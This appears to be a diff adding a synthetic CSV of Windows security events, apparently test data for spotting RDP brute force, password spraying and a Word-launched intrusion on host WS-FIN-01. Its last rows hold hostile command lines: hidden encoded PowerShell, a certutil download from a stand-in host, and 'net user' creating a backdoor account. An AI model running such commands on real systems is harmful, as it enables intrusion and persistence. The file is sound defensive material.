@@ -1,0 +1,25 @@
+TimeCreated,EventID,Computer,TargetUserName,SubjectUserName,IpAddress,LogonType,NewProcessName,CommandLine,ParentProcessName
+2026-10-01T08:00:00Z,4624,WS-FIN-01,maria.silva,,-,2,,,
+2026-10-01T08:03:00Z,4625,WS-FIN-01,maria.silva,,192.168.1.20,2,,,
+2026-10-01T08:04:00Z,4624,WS-FIN-01,maria.silva,,192.168.1.20,2,,,
+2026-10-01T08:10:00Z,4688,WS-FIN-01,,maria.silva,,,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,C:\Windows\explorer.exe
+2026-10-01T08:11:00Z,4688,WS-FIN-01,,maria.silva,,,C:\Windows\System32\notepad.exe,notepad.exe,C:\Windows\explorer.exe
+2026-10-01T09:15:00Z,4625,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T09:15:15Z,4625,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T09:15:30Z,4625,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T09:15:45Z,4625,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T09:16:00Z,4625,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T09:16:15Z,4625,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T09:16:30Z,4625,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T09:16:45Z,4625,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T09:17:30Z,4624,SRV-RDP-01,administrator,,203.0.113.45,10,,,
+2026-10-01T10:40:00Z,4625,SRV-RDP-01,joao,,198.51.100.77,3,,,
+2026-10-01T10:40:20Z,4625,SRV-RDP-01,ana.lima,,198.51.100.77,3,,,
+2026-10-01T10:40:40Z,4625,SRV-RDP-01,carlos,,198.51.100.77,3,,,
+2026-10-01T10:41:00Z,4625,SRV-RDP-01,fernanda,,198.51.100.77,3,,,
+2026-10-01T10:41:20Z,4625,SRV-RDP-01,backup,,198.51.100.77,3,,,
+2026-10-01T10:41:40Z,4625,SRV-RDP-01,suporte,,198.51.100.77,3,,,
+2026-10-01T11:05:00Z,4688,WS-FIN-01,,maria.silva,,,C:\Windows\System32\cmd.exe,cmd.exe /c whoami /all,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+2026-10-01T11:05:20Z,4688,WS-FIN-01,,maria.silva,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA,C:\Windows\System32\cmd.exe
+2026-10-01T11:06:00Z,4688,WS-FIN-01,,maria.silva,,,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://example.invalid/payload.bin C:\Users\Public\p.bin,C:\Windows\System32\cmd.exe
+2026-10-01T11:07:00Z,4688,WS-FIN-01,,maria.silva,,,C:\Windows\System32\net.exe,net user suporte2 Senh@123 /add,C:\Windows\System32\cmd.exe
